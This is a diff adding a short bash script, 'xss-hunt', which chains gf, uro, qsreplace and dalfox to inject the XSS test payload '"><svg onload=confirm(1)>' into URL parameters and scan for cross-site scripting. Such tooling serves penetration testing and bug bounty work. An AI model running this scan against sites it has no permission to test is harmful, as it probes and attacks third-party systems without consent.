@@ -1,0 +1,9 @@
+#!/bin/bash
+# Usage: xss-hunt urls.txt
+
+if [ -z "$1" ]; then
+    echo "Usage: xss-hunt <urls.txt>"
+    exit 1
+fi
+
+cat $1 | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
